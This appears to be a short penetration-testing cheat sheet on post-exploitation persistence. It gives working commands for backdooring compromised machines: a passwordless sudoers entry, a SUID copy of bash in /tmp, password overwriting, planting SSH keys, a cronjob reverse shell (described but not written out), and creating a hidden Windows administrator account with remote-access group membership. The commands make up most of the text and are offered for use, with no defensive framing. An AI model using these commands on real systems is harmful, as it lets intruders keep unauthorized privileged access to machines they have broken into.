# 4_persistence

## Linux

### Root

- Once obtained root, create administrative backdoors using

```shell
# give sudo access
echo "username ALL=NOPASSWD:ALL" >> /etc/sudoers
```

```shell
# give SUID set bash executable
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```

```shell
# overwrite passwords
openssl passwd root
```

### SSH

- Check for the existence of a private key in `~/.ssh/id_rsa`.

- Generate your own SSH key using this [tutorial](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent?platform=linux)

```shell
ssh-keygen -t ed25519 -C "your_email@example.com"
```

- Upload public key of SSH key pair to `authorized_keys_file`.

### Cronjob

- Set up cronjob that establishes reverse shell
 
## Windows

### RDP

- Set up RDP accesss using

```shell
net user a3cipher a3cipher /add
net localgroup Administrators a3cipher /add
net localgroup "Remote Management Users" a3cipher /add
```